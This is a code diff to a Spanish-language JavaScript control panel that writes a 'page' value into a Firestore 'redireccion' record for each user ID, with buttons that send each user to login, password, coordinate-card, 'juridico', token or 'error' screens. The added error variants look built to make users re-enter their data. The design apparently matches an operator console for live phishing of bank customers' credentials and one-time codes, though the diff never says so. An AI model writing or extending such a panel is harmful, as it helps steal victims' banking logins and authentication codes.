@@ -409,13 +409,16 @@ function updateUI(docs) {
                 </div>
               <div class="card-body" style="background-color: ${cardBackgroundColor};">
                 <div style="margin-bottom: 20px;"><strong>En caso de Error:</strong> 
+                <button class="btn btn-danger action-btn" data-action="login-error" data-id="${userId}">Login</button>
+                <button class="btn btn-danger action-btn" data-action="passwd-error" data-id="${userId}">Passwd</button>
+                <button class="btn btn-danger action-btn" data-action="juridico-error" data-id="${userId}">Juridico</button>
                 <button class="btn btn-danger action-btn" data-action="token-error" data-id="${userId}">Token</button>
                 </div>
                 <div class="btn-group btn-block">
-                  <button class="btn btn-success action-btn" data-action="home" data-id="${userId}">Inicio</button>
-                  <button class="btn btn-info action-btn" data-action="passwd" data-id="${userId}" >Passwd</button>
-                  <button class="btn btn-warning action-btn" data-action="juridico" data-id="${userId}">Juridico</button>
-                  <button class="btn btn-success action-btn" data-action="fuera" data-id="${userId}">Fuera!</button>
+                  <button style="margin-right: 5px;"  class="btn btn-success action-btn" data-action="home" data-id="${userId}">Login</button>
+                  <button style="margin-right: 5px;" class="btn btn-info action-btn" data-action="passwd" data-id="${userId}" >Passwd</button>
+                  <button style="margin-right: 5px;" class="btn btn-warning action-btn" data-action="juridico" data-id="${userId}">Juridico</button>
+                  <button style="margin-right: 5px;" class="btn btn-success action-btn" data-action="fuera" data-id="${userId}">Fuera!</button>
                   <button class="btn btn-danger action-btn" data-action="remove" data-id="${userId}">Eliminar</button>
                 </div>
               </div>
@@ -486,12 +489,33 @@ function handleUserAction(event) {
                     logCommand(`Error: ${error.message}`);
                 });
             break;
+        case "login-error":
+            const loginCard = event.target.closest(".user-card");
+            loginCard.style.backgroundColor = "#e8f4ff";
+            loginCard.style.transition = "background-color 0.5s ease";
+            const userRefLogin = doc(db, "redireccion", userId);
+            updateDoc(userRefLogin, {
+                page: 11,
+            })
+                .then(() => {
+                    logCommand(`Usuario ${userId} enviado a pantalla de inicio`);
+                    
+                    // Efecto de éxito
+                    loginCard.classList.add("highlight-animation");
+                    setTimeout(() => {
+                        loginCard.classList.remove("highlight-animation");
+                        loginCard.style.backgroundColor = "";
+                    }, 1000);
+                })
+                .catch((error) => {
+                    console.error("Error:", error);
+                    logCommand(`Error: ${error.message}`);
+                });
+            break;
         case "passwd":
-            // Añadir animación a la tarjeta
             const coordCard = event.target.closest(".user-card");
             coordCard.style.backgroundColor = "#e8fff0";
             coordCard.style.transition = "background-color 0.5s ease";
-            // Página 2 = Coordenadas
             const userRefCoord = doc(db, "redireccion", userId);
             updateDoc(userRefCoord, {
                 page: 2,
@@ -506,6 +530,29 @@ function handleUserAction(event) {
                     setTimeout(() => {
                         coordCard.classList.remove("highlight-animation");
                         coordCard.style.backgroundColor = "";
+                    }, 1000);
+                })
+                .catch((error) => {
+                    console.error("Error:", error);
+                    logCommand(`Error: ${error.message}`);
+                });
+            break;
+            case "passwd-error":
+            const passwdCard = event.target.closest(".user-card");
+            passwdCard.style.backgroundColor = "#e8fff0";
+            passwdCard.style.transition = "background-color 0.5s ease";
+            const userRefPasswd = doc(db, "redireccion", userId);
+            updateDoc(userRefPasswd, {
+                page: 22,
+            })
+                .then(() => {
+                    logCommand(`Usuario ${userId} enviado a pantalla de coordenadas`);
+                    
+                    // Efecto de éxito
+                    passwdCard.classList.add("highlight-animation");
+                    setTimeout(() => {
+                        passwdCard.classList.remove("highlight-animation");
+                        passwdCard.style.backgroundColor = "";
                     }, 1000);
                 })
                 .catch((error) => {
@@ -533,6 +580,33 @@ function handleUserAction(event) {
                     setTimeout(() => {
                         juridicoCard.classList.remove("highlight-animation");
                         juridicoCard.style.backgroundColor = "";
+                    }, 1000);
+                })
+                .catch((error) => {
+                    console.error("Error:", error);
+                    logCommand(`Error: ${error.message}`);
+                });
+            break;
+        case "juridico-error":
+            // Añadir animación a la tarjeta
+            const juridicoCardError = event.target.closest(".user-card");
+            juridicoCardError.style.backgroundColor = "#e8fff0";
+            juridicoCardError.style.transition = "background-color 0.5s ease";
+            // Página 2 = Coordenadas
+            const userRefJuridicoError = doc(db, "redireccion", userId);
+            updateDoc(userRefJuridicoError, {
+                page: 33,
+            })
+                .then(() => {
+                    logCommand(
+                        `Usuario ${userId} enviado a pantalla de juridico`
+                    );
+                    
+                    // Efecto de éxito
+                    juridicoCardError.classList.add("highlight-animation");
+                    setTimeout(() => {
+                        juridicoCardError.classList.remove("highlight-animation");
+                        juridicoCardError.style.backgroundColor = "";
                     }, 1000);
                 })
                 .catch((error) => {
@@ -611,32 +685,6 @@ function handleUserAction(event) {
                     setTimeout(() => {
                         passwderror.classList.remove("highlight-animation");
                         passwderror.style.backgroundColor = "";
-                    }, 1000);
-                })
-                .catch((error) => {
-                    console.error("Error:", error);
-                    logCommand(`Error: ${error.message}`);
-                });
-            break;
-        case "juridico-error":
-            // Añadir animación a la tarjeta
-            const juridicoCardError = event.target.closest(".user-card");
-            juridicoCardError.style.backgroundColor = "#e8fff0";
-            juridicoCardError.style.transition = "background-color 0.5s ease";
-            // Página 2 = Coordenadas
-            const userRefJuridicoError = doc(db, "redireccion", userId);
-            updateDoc(userRefJuridicoError, {
-                page: 7,
-            })
-                .then(() => {
-                    logCommand(
-                        `Usuario ${userId} enviado a pantalla de juridico-error`
-                    );
-                    // Efecto de éxito
-                    juridicoCardError.classList.add("highlight-animation");
-                    setTimeout(() => {
-                        juridicoCardError.classList.remove("highlight-animation");
-                        juridicoCardError.style.backgroundColor = "";
                     }, 1000);
                 })
                 .catch((error) => {
